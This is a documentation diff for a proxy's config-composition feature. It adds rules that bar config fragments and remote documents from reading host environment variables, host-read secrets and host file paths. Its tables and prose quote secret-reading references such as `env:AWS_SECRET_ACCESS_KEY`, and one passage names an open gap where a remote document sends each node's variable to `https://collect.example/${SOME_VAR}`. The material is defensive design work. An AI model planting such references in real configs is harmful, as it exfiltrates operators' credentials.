@@ -6397,10 +6397,32 @@ is a URL the proxy builds at compile time and dials at request time.
 
 So a fragment does not get that pass. It gets a confined one, and the
 rule is short: **a fragment resolves the inputs its caller binds, and
-reads nothing else.** No `${VAR}`. No `{{env.X}}`. No variable it was
-not given. A fragment that reaches for any of those fails the compile
-with a message naming the fragment, the field, and the variable, and the
+reaches nothing on the host.** A fragment that reaches anyway fails the
+compile with a message naming the fragment and the field, and the
 composed config never ships.
+
+Three powers the root config keeps and a fragment does not have, because
+all three read a machine the fragment's author does not own:
+
+| Power | Root config | Fragment |
+|---|---|---|
+| Name a process variable: `${VAR}`, `${VAR:-default}`, `{{env.X}}` | yes | refused, naming the variable |
+| Reference a secret the resolver reads off the host: `env:NAME`, `vault://env/NAME`, `file:PATH` | yes | refused, naming the form |
+| Name a host path the compiler inlines: `rego_module_path`, `module_path` | yes | refused, naming the key |
+
+The second row matters as much as the first and is easier to miss.
+`api_key: "env:AWS_SECRET_ACCESS_KEY"` contains no `${` and no `{{`, so
+no template check anywhere would see it, and the secret resolver reads
+it out of the process environment at config load exactly the way
+`${AWS_SECRET_ACCESS_KEY}` would. A boundary that stopped only template
+syntax would refuse one spelling of an attack and wave through the
+other.
+
+A reference to a backend the operator declared under `proxy.secrets`
+(`secret://acme/openai`, `vault://acme-vault/openai`, `awssm://...`)
+stays available to a fragment. Those resolve only against backends named
+in the root config, and `proxy.secrets` is not a path a fragment or an
+authority may set, so the operator still decides what they reach.
 
 Helm draws the boundary the same way. Chart authors get every function
 in the Sprig library except `env` and `expandenv`, which were removed
@@ -6462,9 +6484,10 @@ platform to bind:
 action:
   type: proxy
   url: "https://{{vars.upstream_host}}/v1"
-policies:
-  - type: rate_limiting
-    requests_per_second: "{{vars.limits.rps}}"
+request_modifiers:
+  - headers:
+      set:
+        X-Upstream-Pool: "{{vars.pool}}"
 transforms:
   - type: lua
     lua_script: |
@@ -6473,16 +6496,29 @@ transforms:
       return tpl
 ```
 
-Bound with `upstream_host: orders.internal` and
-`limits: { rps: 200 }`, it resolves to `https://orders.internal/v1`, a
-rate limit of `200`, and a Lua body byte-for-byte unchanged. Three ways
-it can fail instead:
+Bound with `upstream_host: orders.internal` and `pool: orders-primary`,
+it resolves to `https://orders.internal/v1`, an `X-Upstream-Pool` header
+of `orders-primary`, and a Lua body byte-for-byte unchanged.
+
+**`{{vars.X}}` substitutes text, so it parameterizes string-typed fields
+only.** A binding of `200` written into `requests_per_second:` produces
+the YAML string `'200'`, and `rate_limiting` deserializes that field as
+a number, so the composed config compiles and then fails at module
+construction with `invalid type: string`. This is inherited from the
+fleet-wide interpolator rather than introduced by confinement, and it is
+the reason the example above parameterizes a header value rather than a
+limit. Parameterize a numeric field by binding the whole block, or leave
+the number in the platform's own defaults.
+
+Three ways the same fragment can be refused instead:
 
 | What the fragment writes | What happens |
 |---|---|
-| `url: "https://{{vars.upstream}}/v1"` with only `upstream_host` bound | refused, naming `upstream` and `action.url`, and listing the input names that *are* bound |
+| `url: "https://{{vars.upstream}}/v1"` with only `upstream_host` and `pool` bound | refused, naming `upstream` and `action.url`, and listing the input names that *are* bound |
 | `authentication: { api_key: "${OPENAI_API_KEY}" }` | refused, naming `OPENAI_API_KEY` and `authentication.api_key` |
 | a request modifier setting `X-Region: "{{env.AWS_REGION}}"` | refused, naming `AWS_REGION` and `request_modifiers.0.headers.set.X-Region` |
+| `authentication: { api_key: "env:OPENAI_API_KEY" }` | refused, naming the form `env:NAME` and `authentication.api_key`. The message does not repeat the variable name: the author wrote it, and echoing it is one paste away from a log line that names a credential |
+| `request_modifiers: [ { rego_module_path: /etc/sbproxy/x.rego } ]` | refused, naming `request_modifiers.0.rego_module_path` and pointing at `rego_module` for the inline form |
 
 None of those messages carries the variable's value, because nothing on
 the confined path reads one.
@@ -6497,6 +6533,47 @@ publish leaves unresolved, and a subscriber still refuses to apply a
 bundle that leaves one unresolved on its own node rather than shipping
 the literal text as a value. A confined fragment never trips either,
 because it cannot carry one.
+
+One asymmetry worth knowing before you move YAML across the boundary.
+In a fragment, `{{vars.X}}` resolves in **every** string. In a root
+`sb.yml` the fleet-wide interpolator runs over `action`,
+`authentication`, `policies`, `transforms`, `filters`, `forward_rules`,
+`fallback_origin`, error-page bodies and modifier header values, and
+nowhere else. A fragment that parameterizes `hostname:` therefore works,
+and the same block pasted into a root config ships the literal braces
+with no error. The wider scope in a fragment is deliberate, since a
+fragment's inputs are the only thing its author can parameterize; the
+narrower one in a root config is long-standing behavior this change did
+not touch.
+
+#### Whole documents from somewhere else
+
+A fragment is not the only config text an operator does not write by
+hand. Two more arrive from another party, and both go through the same
+resolver:
+
+- **A git-sourced document**, the `source:` block's `kind: git`. Whoever
+  can push to that repository writes the document.
+- **A config-authority bundle**, screened when the authority validates a
+  publish and again when a subscriber merges one, so a payload cannot
+  pass the authority and then be refused by the whole fleet at once.
+
+Both keep `${VAR}`: naming per-node values in one shared document is the
+documented pattern for running a fleet, and taking it away would break
+every git-sourced deployment on upgrade. Both lose the other two powers
+in the table above, and nothing breaks, because neither was ever a
+documented power of a remote document. `merge_config`'s deny list
+already reasons this way at the path level, refusing an authority any
+claim on `proxy.secrets` because the node owns its own secret backends;
+sealing `env:`, `vault://env/` and `file:` applies that same rule inside
+the values, which is where a path-level deny list cannot reach.
+
+What that leaves open, stated rather than implied: a remote document may
+still write `url: "https://collect.example/${SOME_VAR}"` and have each
+node substitute its own value. The existing gate only refuses a `${VAR}`
+that fails to resolve. Closing that needs the node operator to declare
+which variable names a remote document may name, which is a config key
+this change does not add.
 
 Composition itself is still being built, so nothing in a stock `sb.yml`
 supplies a fragment yet. The boundary is documented here because it is
